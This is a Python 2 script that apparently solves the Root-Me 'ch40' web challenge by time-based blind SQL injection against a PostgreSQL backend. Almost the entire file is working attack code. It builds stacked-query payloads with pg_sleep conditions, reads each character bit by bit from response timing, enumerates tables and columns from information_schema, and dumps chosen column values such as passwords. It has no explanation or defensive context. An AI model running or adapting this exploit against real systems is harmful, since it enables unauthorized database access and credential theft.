import requests
import string
import time
import os


def backup(name, strs):
    f = None
    if os.path.isfile(name):
        f = open(name, 'ab')
    else:
        f = open(name, 'wb')
    f.write(str(strs)+'\n')
    f.close()
        


def getFlag(qr):
    global flags, binn
    print '###################################################'
    print '###################################################'
    print '###################################################'
    while True:
        for idx in range(7):
            query = qr
            condition = 'substr(ascii(substr(({0}),{1},1))::bit(7)::text,{2},1)=1::text'.format(query, len(flags)+1, idx+1)
            payload = '2;select case when ({0}) then pg_sleep(5) else pg_sleep(0) end; -- '.format(condition) 
            print 'payload: ' + payload
            url = 'http://challenge01.root-me.org/web-serveur/ch40/'
            params = {'action' : 'member', 'member': payload}
            start = time.time()
            res = requests.get(url, params=params)
            end = time.time()
            if end-start > 2:
                binn += '1'
            else:
                binn += '0'

        print 'bin: ' + str(binn)
        ch = chr(int(binn, 2))

        print 'char: ' + ch

        if ch in ascii_table:
            print 'found!!!  ::: [' +ch+']'
            flags += ch
            binn = ''
        else:
            print '###################################################'
            print '###################################################'
            print '###################################################'
            print 'flags: ' + flags
            break
    binn = ''
    res = flags
    flags = ''
    return res

ascii_table = string.digits + string.letters + '!@#$%^&*()_+-={}[]:;<>?,./'
name_table = 'users'
name_columns = []
passwords = []
binn = ''
flags = ''

fname = 'bk.txt'

#get table
query = 'select table_name from information_schema.tables limit 1'
name_table = getFlag(query)
backup(fname, name_table)

#get columns 
query = 'select column_name from information_schema.columns limit 1 offset {0}'
for i in range(10):
    name_columns.append(getFlag(query.format(i)))
    print name_columns

backup(fname, name_columns)

print '\n\n\n------------------------------------------------------'
print 'list of columns : ' + str(name_columns)
print '\n\n\n------------------------------------------------------'

name_column = raw_input('input column name you want to get:')
query = 'select {0} from {1} limit 1'.format(name_column, name_table)
for i in range(3):
    passwords.append(getFlag(query+' offset {0}'.format(i)))
    print passwords





            

        
        



